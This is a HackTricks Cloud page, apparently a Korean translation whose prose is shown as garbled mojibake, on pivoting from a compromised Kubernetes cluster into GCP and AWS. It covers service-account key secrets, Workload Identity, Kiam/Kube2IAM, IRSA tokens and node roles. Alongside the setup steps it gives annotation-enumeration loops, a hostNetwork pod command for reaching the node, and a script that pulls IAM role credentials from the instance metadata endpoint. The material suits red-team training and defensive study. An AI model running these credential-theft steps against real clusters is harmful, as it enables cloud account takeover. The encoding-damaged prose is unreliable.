# Kubernetes Pivoting to Clouds

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## GCP

GCP ë‚´ì—ì„œ k8s í´ëŸ¬ìŠ¤í„°ë¥¼ ì‹¤í–‰í•˜ëŠ” ê²½ìš°, í´ëŸ¬ìŠ¤í„° ë‚´ì—ì„œ ì‹¤í–‰ë˜ëŠ” ì¼ë¶€ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ GCPì— ì ‘ê·¼í•  ìˆ˜ ìˆë„ë¡ í•˜ë ¤ëŠ” ê²½ìš°ê°€ ë§ìŠµë‹ˆë‹¤. ì´ë¥¼ ìˆ˜í–‰í•˜ëŠ” ì¼ë°˜ì ì¸ ë°©ë²•ì€ 2ê°€ì§€ì…ë‹ˆë‹¤:

### GCP-SA í‚¤ë¥¼ ë¹„ë°€ë¡œ ë§ˆìš´íŠ¸í•˜ê¸°

**Kubernetes ì• í”Œë¦¬ì¼€ì´ì…˜ì— GCP ì ‘ê·¼ ê¶Œí•œì„ ë¶€ì—¬í•˜ëŠ”** ì¼ë°˜ì ì¸ ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* GCP ì„œë¹„ìŠ¤ ê³„ì • ìƒì„±
* ì›í•˜ëŠ” ê¶Œí•œì„ ë°”ì¸ë”©
* ìƒì„±ëœ SAì˜ json í‚¤ ë‹¤ìš´ë¡œë“œ
* í¬ë“œ ë‚´ì—ì„œ ë¹„ë°€ë¡œ ë§ˆìš´íŠ¸
* jsonì´ ìˆëŠ” ê²½ë¡œë¥¼ ê°€ë¦¬í‚¤ë„ë¡ GOOGLE\_APPLICATION\_CREDENTIALS í™˜ê²½ ë³€ìˆ˜ë¥¼ ì„¤ì •í•©ë‹ˆë‹¤.

{% hint style="warning" %}
ë”°ë¼ì„œ **ê³µê²©ì**ë¡œì„œ í¬ë“œ ë‚´ì˜ ì»¨í…Œì´ë„ˆë¥¼ ì†ìƒì‹œí‚¤ë©´, GCP ìê²© ì¦ëª…ì´ í¬í•¨ëœ **env** **ë³€ìˆ˜**ì™€ **json** **íŒŒì¼**ì„ í™•ì¸í•´ì•¼ í•©ë‹ˆë‹¤.
{% endhint %}

### GSA jsonì„ KSA ë¹„ë°€ì— ì—°ê²°í•˜ê¸°

GKE í´ëŸ¬ìŠ¤í„°ì— GSA ì ‘ê·¼ ê¶Œí•œì„ ë¶€ì—¬í•˜ëŠ” ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ì´ ë°”ì¸ë”©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤:

* ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ GKE í´ëŸ¬ìŠ¤í„°ì™€ ë™ì¼í•œ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì— Kubernetes ì„œë¹„ìŠ¤ ê³„ì •ì„ ìƒì„±í•©ë‹ˆë‹¤:
```bash
Copy codekubectl create serviceaccount <service-account-name>
```
* GKE í´ëŸ¬ìŠ¤í„°ì— ì ‘ê·¼ ê¶Œí•œì„ ë¶€ì—¬í•  GCP ì„œë¹„ìŠ¤ ê³„ì •ì˜ ìê²© ì¦ëª…ì„ í¬í•¨í•˜ëŠ” Kubernetes Secretì„ ìƒì„±í•©ë‹ˆë‹¤. ë‹¤ìŒ ì˜ˆì œì™€ ê°™ì´ `gcloud` ëª…ë ¹ì¤„ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ì´ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
--iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
--from-file=key.json=<key-file-name>.json
```
* ë‹¤ìŒ ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ Kubernetes Secretì„ Kubernetes ì„œë¹„ìŠ¤ ê³„ì •ì— ë°”ì¸ë”©í•©ë‹ˆë‹¤:
```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
iam.gke.io/gcp-service-account=<gcp-service-account-email>
```
{% hint style="warning" %}
**ë‘ ë²ˆì§¸ ë‹¨ê³„**ì—ì„œëŠ” **KSAì˜ ë¹„ë°€ë¡œ GSAì˜ ìê²© ì¦ëª…ì„ ì„¤ì •**í–ˆìŠµë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ, **GKE** í´ëŸ¬ìŠ¤í„° **ë‚´ë¶€**ì—ì„œ **ê·¸ ë¹„ë°€ì„ ì½ì„ ìˆ˜** ìˆë‹¤ë©´, **í•´ë‹¹ GCP ì„œë¹„ìŠ¤ ê³„ì •ìœ¼ë¡œ ìƒìŠ¹**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

### GKE ì‘ì—… ë¶€í•˜ ì‹ ì›

ì‘ì—… ë¶€í•˜ ì‹ ì›ì„ ì‚¬ìš©í•˜ë©´ [Kubernetes ì„œë¹„ìŠ¤ ê³„ì •](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/)ì„ [Google ì„œë¹„ìŠ¤ ê³„ì •](https://cloud.google.com/iam/docs/understanding-service-accounts)ìœ¼ë¡œ ì‘ë™í•˜ë„ë¡ êµ¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. Kubernetes ì„œë¹„ìŠ¤ ê³„ì •ìœ¼ë¡œ ì‹¤í–‰ë˜ëŠ” íŒŒë“œëŠ” Google Cloud APIì— ì ‘ê·¼í•  ë•Œ ìë™ìœ¼ë¡œ Google ì„œë¹„ìŠ¤ ê³„ì •ìœ¼ë¡œ ì¸ì¦ë©ë‹ˆë‹¤.

ì´ ë™ì‘ì„ í™œì„±í™”í•˜ê¸° ìœ„í•œ **ì²« ë²ˆì§¸ ì¼ë ¨ì˜ ë‹¨ê³„**ëŠ” **GCPì—ì„œ ì‘ì—… ë¶€í•˜ ì‹ ì› í™œì„±í™”**í•˜ê¸° ([**ë‹¨ê³„**](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)) ë° k8sê°€ ê°€ì¥í•˜ê³ ì í•˜ëŠ” GCP SAë¥¼ ìƒì„±í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

* **ìƒˆ í´ëŸ¬ìŠ¤í„°ì—ì„œ ì‘ì—… ë¶€í•˜ ì‹ ì› í™œì„±í™”**
```bash
gcloud container clusters update <cluster_name> \
--region=us-central1 \
--workload-pool=<project-id>.svc.id.goog
```
{% endcode %}

* **ìƒˆ ë…¸ë“œ í’€ ìƒì„±/ì—…ë°ì´íŠ¸** (ì˜¤í† íŒŒì¼ëŸ¿ í´ëŸ¬ìŠ¤í„°ëŠ” í•„ìš”í•˜ì§€ ì•ŠìŒ)

{% code overflow="wrap" %}
```bash
# You could update instead of create
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
{% endcode %}

* K8sì—ì„œ GCP ê¶Œí•œìœ¼ë¡œ **ê°€ì§œ GCP ì„œë¹„ìŠ¤ ê³„ì •**ì„ ìƒì„±í•©ë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
# Create SA called "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Give "roles/iam.securityReviewer" role to the SA
gcloud projects add-iam-policy-binding <project-id> \
--member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
--role "roles/iam.securityReviewer"
```
{% endcode %}

* **í´ëŸ¬ìŠ¤í„°**ì— **ì—°ê²°**í•˜ê³  ì‚¬ìš©í•  **ì„œë¹„ìŠ¤ ê³„ì •**ì„ **ìƒì„±**í•©ë‹ˆë‹¤.

{% code overflow="wrap" %}
```bash
# Get k8s creds
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# Generate our testing namespace
kubectl create namespace testing

# Create the KSA
kubectl create serviceaccount ksa2gcp -n testing
```
{% endcode %}

* **GSAë¥¼ KSAì™€ ë°”ì¸ë”©í•˜ê¸°**

{% code overflow="wrap" %}
```bash
# Allow the KSA to access the GSA in GCP IAM
gcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \
--role roles/iam.workloadIdentityUser \
--member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"

# Indicate to K8s that the SA is able to impersonate the GSA
kubectl annotate serviceaccount ksa2gcp \
--namespace testing \
iam.gke.io/gcp-service-account=gsa2ksa@security-devbox.iam.gserviceaccount.com
```
{% endcode %}

* **KSA**ë¡œ **pod**ë¥¼ ì‹¤í–‰í•˜ê³  **GSA**ì— ëŒ€í•œ **ì ‘ê·¼**ì„ í™•ì¸í•©ë‹ˆë‹¤:
```bash
# If using Autopilot remove the nodeSelector stuff!
echo "apiVersion: v1
kind: Pod
metadata:
name: workload-identity-test
namespace: <namespace>
spec:
containers:
- image: google/cloud-sdk:slim
name: workload-identity-test
command: ['sleep','infinity']
serviceAccountName: ksa2gcp
nodeSelector:
iam.gke.io/gke-metadata-server-enabled: 'true'" | kubectl apply -f-

# Get inside the pod
kubectl exec -it workload-identity-test \
--namespace testing \
-- /bin/bash

# Check you can access the GSA from insie the pod with
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
gcloud auth list
```
ë‹¤ìŒ ëª…ë ¹ì–´ë¥¼ í™•ì¸í•˜ì—¬ í•„ìš” ì‹œ ì¸ì¦í•˜ì‹­ì‹œì˜¤:

{% code overflow="wrap" %}
```bash
gcloud auth activate-service-account --key-file=/var/run/secrets/google/service-account/key.json
```
{% endcode %}

{% hint style="warning" %}
K8s ë‚´ë¶€ì˜ ê³µê²©ìë¡œì„œ **`iam.gke.io/gcp-service-account` ì£¼ì„**ì´ ìˆëŠ” **SAs**ë¥¼ **ê²€ìƒ‰í•´ì•¼** í•©ë‹ˆë‹¤. ì´ëŠ” SAê°€ GCPì˜ ë¬´ì–¸ê°€ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. ë˜ ë‹¤ë¥¸ ì˜µì…˜ì€ í´ëŸ¬ìŠ¤í„° ë‚´ì˜ ê° KSAë¥¼ ë‚¨ìš©í•´ë³´ê³  ì ‘ê·¼ ê¶Œí•œì´ ìˆëŠ”ì§€ í™•ì¸í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.\
GCPì—ì„œ í•­ìƒ ë°”ì¸ë”©ì„ ë‚˜ì—´í•˜ê³  **Kubernetes ë‚´ SAsì— ì–´ë–¤ ì ‘ê·¼ ê¶Œí•œì„ ë¶€ì—¬í•˜ê³  ìˆëŠ”ì§€ ì•„ëŠ” ê²ƒì´ í¥ë¯¸ë¡­ìŠµë‹ˆë‹¤**.
{% endhint %}

ì´ê²ƒì€ **ì£¼ì„**ì„ **ì°¾ê¸° ìœ„í•´ ëª¨ë“  í¬ë“œ** ì •ì˜ë¥¼ ì‰½ê²Œ **ë°˜ë³µí•˜ëŠ”** ìŠ¤í¬ë¦½íŠ¸ì…ë‹ˆë‹¤:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
echo ""
echo ""
done
done | grep -B 1 "gcp-service-account"
```
## AWS

### Kiam & Kube2IAM (IAM ì—­í• ì„ ìœ„í•œ Pods) <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Podsì— IAM ì—­í• ì„ ë¶€ì—¬í•˜ëŠ” (êµ¬ì‹) ë°©ë²•ì€ [**Kiam**](https://github.com/uswitch/kiam) ë˜ëŠ” [**Kube2IAM**](https://github.com/jtblin/kube2iam) **ì„œë²„**ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ê¸°ë³¸ì ìœ¼ë¡œ í´ëŸ¬ìŠ¤í„°ì—ì„œ **íŠ¹ê¶Œ IAM ì—­í• **ì˜ **ë°ëª¬ì…‹**ì„ ì‹¤í–‰í•´ì•¼ í•©ë‹ˆë‹¤. ì´ ë°ëª¬ì…‹ì´ í•„ìš”í•œ Podsì— IAM ì—­í• ì— ëŒ€í•œ ì ‘ê·¼ì„ ì œê³µí•©ë‹ˆë‹¤.

ìš°ì„  **ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ë‚´ì—ì„œ ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ì—­í• ì„ êµ¬ì„±**í•´ì•¼ í•˜ë©°, ì´ëŠ” ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ê°ì²´ ë‚´ì˜ ì£¼ì„ì„ í†µí•´ ìˆ˜í–‰í•©ë‹ˆë‹¤:

{% code title="Kiam" %}
```yaml
kind: Namespace
metadata:
name: iam-example
annotations:
iam.amazonaws.com/permitted: ".*"
```
{% endcode %}

{% code title="Kube2iam" %}
```yaml
apiVersion: v1
kind: Namespace
metadata:
annotations:
iam.amazonaws.com/allowed-roles: |
["role-arn"]
name: default
```
{% endcode %}

ë„¤ì„ìŠ¤í˜ì´ìŠ¤ê°€ IAM ì—­í• ë¡œ êµ¬ì„±ë˜ë©´, PodsëŠ” **ê° pod ì •ì˜ì—ì„œ ì›í•˜ëŠ” ì—­í• ì„ ë‹¤ìŒê³¼ ê°™ì´ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**:

{% code title="Kiam & Kube2iam" %}
```yaml
kind: Pod
metadata:
name: foo
namespace: external-id-example
annotations:
iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}
ê³µê²©ìë¡œì„œ, ë§Œì•½ **ì´ ì£¼ì„**ì„ íŒŒë“œë‚˜ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì—ì„œ ë°œê²¬í•˜ê±°ë‚˜ kiam/kube2iam ì„œë²„ê°€ ì‹¤í–‰ ì¤‘ì¸ ê²½ìš°(ì•„ë§ˆë„ kube-systemì—ì„œ) **ëª¨ë“  r**oleì„ **ê°€ì¥í•  ìˆ˜** ìˆìœ¼ë©°, ë” ë§ì€ ê²ƒì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ë§Œì•½ AWS ê³„ì •ì— ì ‘ê·¼í•  ìˆ˜ ìˆë‹¤ë©´ ì—­í• ì„ ë‚˜ì—´í•˜ì‹­ì‹œì˜¤).
{% endhint %}

#### IAM ì—­í• ë¡œ íŒŒë“œ ìƒì„±

{% hint style="info" %}
ì§€ì •í•´ì•¼ í•˜ëŠ” IAM ì—­í• ì€ kiam/kube2iam ì—­í• ê³¼ ë™ì¼í•œ AWS ê³„ì •ì— ìˆì–´ì•¼ í•˜ë©°, ê·¸ ì—­í• ì€ ì´ë¥¼ ì ‘ê·¼í•  ìˆ˜ ìˆì–´ì•¼ í•©ë‹ˆë‹¤.
{% endhint %}
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
annotations:
iam.amazonaws.com/role: transaction-metadata
name: alpine
namespace: eevee
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", "sleep 100000"]' | kubectl apply -f -
```
### IAM Role for K8s Service Accounts via OIDC <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

ì´ê²ƒì€ **AWSì—ì„œ ê¶Œì¥í•˜ëŠ” ë°©ë²•**ì…ë‹ˆë‹¤.

1. ë¨¼ì € [í´ëŸ¬ìŠ¤í„°ì— ëŒ€í•œ OIDC ê³µê¸‰ìë¥¼ ìƒì„±í•´ì•¼ í•©ë‹ˆë‹¤](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html).
2. ê·¸ëŸ° ë‹¤ìŒ SAì— í•„ìš”í•œ ê¶Œí•œìœ¼ë¡œ IAM ì—­í• ì„ ìƒì„±í•©ë‹ˆë‹¤.
3. [IAM ì—­í• ê³¼ SA ê°„ì˜ ì‹ ë¢° ê´€ê³„ë¥¼ ìƒì„±í•©ë‹ˆë‹¤](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html) (ë˜ëŠ” ì—­í• ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ë¥¼ ëª¨ë“  SAì— ë¶€ì—¬í•˜ëŠ” ë„¤ì„ìŠ¤í˜ì´ìŠ¤). _ì‹ ë¢° ê´€ê³„ëŠ” ì£¼ë¡œ OIDC ê³µê¸‰ì ì´ë¦„, ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ì´ë¦„ ë° SA ì´ë¦„ì„ í™•ì¸í•©ë‹ˆë‹¤_.
4. ë§ˆì§€ë§‰ìœ¼ë¡œ, **ì—­í• ì˜ ARNì„ ë‚˜íƒ€ë‚´ëŠ” ì£¼ì„ì´ ìˆëŠ” SAë¥¼ ìƒì„±í•˜ê³ **, í•´ë‹¹ SAë¡œ ì‹¤í–‰ë˜ëŠ” í¬ë“œëŠ” **ì—­í• ì˜ í† í°ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**. **í† í°**ì€ **íŒŒì¼ì— ê¸°ë¡ë˜ë©°** ê²½ë¡œëŠ” **`AWS_WEB_IDENTITY_TOKEN_FILE`**ì— ì§€ì •ë©ë‹ˆë‹¤ (ê¸°ë³¸ê°’: `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`)
```bash
# Create a service account with a role
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
name: my-service-account
namespace: default
annotations:
eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
kubectl apply -f my-service-account.yaml

# Add a role to an existent service account
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```
To **get aws using the token** from `/var/run/secrets/eks.amazonaws.com/serviceaccount/token` run:

{% code overflow="wrap" %}
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
{% endcode %}

{% hint style="warning" %}
ê³µê²©ìë¡œì„œ K8s í´ëŸ¬ìŠ¤í„°ë¥¼ ì—´ê±°í•  ìˆ˜ ìˆë‹¤ë©´, **AWSë¡œ ìƒìŠ¹í•˜ê¸° ìœ„í•´ í•´ë‹¹ ì£¼ì„ì´ ìˆëŠ” ì„œë¹„ìŠ¤ ê³„ì •**ì„ í™•ì¸í•˜ì‹­ì‹œì˜¤. ê·¸ë ‡ê²Œ í•˜ë ¤ë©´, IAM **íŠ¹ê¶Œ ì„œë¹„ìŠ¤ ê³„ì •** ì¤‘ í•˜ë‚˜ë¥¼ ì‚¬ìš©í•˜ì—¬ **pod**ë¥¼ **exec/create**í•˜ê³  í† í°ì„ í›”ì¹˜ë©´ ë©ë‹ˆë‹¤.

ë˜í•œ, pod ë‚´ë¶€ì— ìˆëŠ” ê²½ìš° **AWS\_ROLE\_ARN** ë° **AWS\_WEB\_IDENTITY\_TOKEN**ê³¼ ê°™ì€ í™˜ê²½ ë³€ìˆ˜ë¥¼ í™•ì¸í•˜ì‹­ì‹œì˜¤.
{% endhint %}

{% hint style="danger" %}
ë•Œë•Œë¡œ ì—­í• ì˜ **ì‹ ë¢° ì •ì±…**ì´ **ì˜ëª» êµ¬ì„±**ë˜ì–´ ì˜ˆìƒë˜ëŠ” ì„œë¹„ìŠ¤ ê³„ì •ì— AssumeRole ì•¡ì„¸ìŠ¤ë¥¼ ë¶€ì—¬í•˜ëŠ” ëŒ€ì‹  **ëª¨ë“  ì„œë¹„ìŠ¤ ê³„ì •**ì— ë¶€ì—¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì œì–´ëœ ì„œë¹„ìŠ¤ ê³„ì •ì— ì£¼ì„ì„ ì‘ì„±í•  ìˆ˜ ìˆë‹¤ë©´, í•´ë‹¹ ì—­í• ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒ í˜ì´ì§€ë¥¼ í™•ì¸í•˜ì‹­ì‹œì˜¤**:
{% endhint %}

{% content-ref url="../aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

### í´ëŸ¬ìŠ¤í„°ì—ì„œ IAM ì—­í• ì´ ìˆëŠ” SAsì˜ Pods ì°¾ê¸°

ì´ ìŠ¤í¬ë¦½íŠ¸ëŠ” **ëª¨ë“  pods ë° sas** ì •ì˜ë¥¼ ì‰½ê²Œ **ë°˜ë³µ**í•˜ì—¬ í•´ë‹¹ **ì£¼ì„**ì„ **ì°¾ëŠ”** ê²ƒì…ë‹ˆë‹¤:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "SA: $ns/$sa"
kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
done | grep -B 1 "amazonaws.com"
```
### Node IAM Role

ì´ì „ ì„¹ì…˜ì€ podsë¡œ IAM Rolesë¥¼ í›”ì¹˜ëŠ” ë°©ë²•ì— ëŒ€í•œ ê²ƒì´ì—ˆì§€ë§Œ, **K8s í´ëŸ¬ìŠ¤í„°ì˜ NodeëŠ” í´ë¼ìš°ë“œ ë‚´ì˜ ì¸ìŠ¤í„´ìŠ¤ê°€ ë  ê²ƒ**ì´ë¼ëŠ” ì ì— ìœ ì˜í•´ì•¼ í•©ë‹ˆë‹¤. ì´ëŠ” Nodeê°€ **í›”ì¹  ìˆ˜ ìˆëŠ” ìƒˆë¡œìš´ IAM ì—­í• ì„ ê°€ì§ˆ ê°€ëŠ¥ì„±ì´ ë†’ë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤** (_ì¼ë°˜ì ìœ¼ë¡œ K8s í´ëŸ¬ìŠ¤í„°ì˜ ëª¨ë“  ë…¸ë“œëŠ” ë™ì¼í•œ IAM ì—­í• ì„ ê°€ì§€ë¯€ë¡œ ê° ë…¸ë“œë¥¼ í™•ì¸í•˜ë ¤ê³  ì‹œë„í•˜ëŠ” ê²ƒì´ ê·¸ë‹¤ì§€ ê°€ì¹˜ê°€ ì—†ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤_).

ê·¸ëŸ¬ë‚˜ ë…¸ë“œì—ì„œ ë©”íƒ€ë°ì´í„° ì—”ë“œí¬ì¸íŠ¸ì— ì ‘ê·¼í•˜ê¸° ìœ„í•œ ì¤‘ìš”í•œ ìš”êµ¬ ì‚¬í•­ì´ ìˆìŠµë‹ˆë‹¤. ë…¸ë“œì— ìˆì–´ì•¼ í•˜ê±°ë‚˜ (ssh ì„¸ì…˜?) ìµœì†Œí•œ ë™ì¼í•œ ë„¤íŠ¸ì›Œí¬ì— ìˆì–´ì•¼ í•©ë‹ˆë‹¤:
```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```
### IAM ì—­í•  í† í° í›”ì¹˜ê¸°

ì´ì „ì— ìš°ë¦¬ëŠ” **IAM ì—­í• ì„ Podsì— ì—°ê²°í•˜ëŠ” ë°©ë²•** ë˜ëŠ” **ë…¸ë“œë¡œ íƒˆì¶œí•˜ì—¬ ì¸ìŠ¤í„´ìŠ¤ì— ì—°ê²°ëœ IAM ì—­í• ì„ í›”ì¹˜ëŠ” ë°©ë²•**ì— ëŒ€í•´ ë…¼ì˜í–ˆìŠµë‹ˆë‹¤.

ë‹¤ìŒ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ **ìƒˆë¡œ ì—´ì‹¬íˆ ì‘ì—…í•œ IAM ì—­í•  ìê²© ì¦ëª…**ì„ **í›”ì¹ ** ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
echo "IAM Role discovered: $IAM_ROLE_NAME"
if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
echo "Credentials:"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
fi
fi
```
## References

* [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
